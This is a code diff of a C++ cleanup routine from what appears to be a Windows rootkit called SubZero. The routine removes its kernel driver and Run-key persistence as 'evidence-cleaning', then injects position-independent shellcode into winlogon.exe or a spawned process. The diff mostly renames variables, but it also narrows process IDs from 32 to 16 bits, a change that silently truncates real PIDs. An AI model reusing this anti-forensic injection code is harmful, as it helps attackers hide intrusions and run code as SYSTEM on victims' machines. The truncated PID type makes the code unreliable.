@@ -19,7 +19,7 @@ void SubZeroCleanup::Cleanup()
 	// evidence-cleaning function will be called - even in case of an error on the way.
     std::stringstream finalException("");
 
-    std::uint32_t picTargetPID = 0;
+    std::uint16_t pisTargetPID = 0;
 	
     // Uninstall SubZero driver if exists. 
     const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
@@ -56,7 +56,7 @@ void SubZeroCleanup::Cleanup()
                 }
 
             	// Current process now will bw able to inject the PIS to winlogon.exe
-                picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
+                pisTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
             }
         }
         catch (std::exception& exception)
@@ -69,11 +69,13 @@ void SubZeroCleanup::Cleanup()
     }
 
     // Delete registry value
-    try {
+    try 
+    {
         const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
         RegistryManager::DeleteRegistryValue(autoRegKey.get(), REG_VALUE_NAME);
     }
-    catch (const Win32ErrorCodeException& exception) {
+    catch (const Win32ErrorCodeException& exception) 
+    {
         finalException << DEBUG_TEXT(exception.what() << "\n");
     }
 
@@ -86,7 +88,7 @@ void SubZeroCleanup::Cleanup()
     }
 	
 	// If there was an error elevating explorer to SYSTEM
-	if (0 == picTargetPID)
+	if (0 == pisTargetPID)
     {
 		STARTUPINFO si;
 		PROCESS_INFORMATION pi;
@@ -114,18 +116,16 @@ void SubZeroCleanup::Cleanup()
         ::CloseHandle(pi.hProcess);
         ::CloseHandle(pi.hThread);
 		
-        picTargetPID = pi.dwProcessId;
+        pisTargetPID = pi.dwProcessId;
     }
 
     // Setup PIS parameters
-    PisParameters picParams =
-    {
-        LoadLibraryA,
-    	GetProcAddress,
-        static_cast<int>(::GetCurrentProcessId())
-    };
+    PisParameters pisParameters;
+    pisParameters.loadLibraryA = LoadLibraryA;
+    pisParameters.getProcAddress = GetProcAddress;
+    pisParameters.pid = static_cast<int>(::GetCurrentProcessId());
 
-    if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
+    if (nullptr == pisParameters.getProcAddress || nullptr == pisParameters.loadLibraryA)
         finalException << DEBUG_TEXT("[-] Invalid PIS parameters\n");
 	
     else 
@@ -133,7 +133,7 @@ void SubZeroCleanup::Cleanup()
         // Inject PIS
         try
         {
-            PISInjection::InjectPic<PisParameters>(picTargetPID, &picParams, PisStart, PisEnd);
+            PISInjection::InjectPis<PisParameters>(pisTargetPID, &pisParameters, PisStart, PisEnd);
         }
         catch (std::exception& exception)
         {
@@ -146,7 +146,7 @@ void SubZeroCleanup::Cleanup()
         throw std::runtime_error(finalException.str());
 }
 
-std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& processName)
+std::uint16_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& processName)
 {
     RunningProcesses processes;
     for (const auto& process : processes)
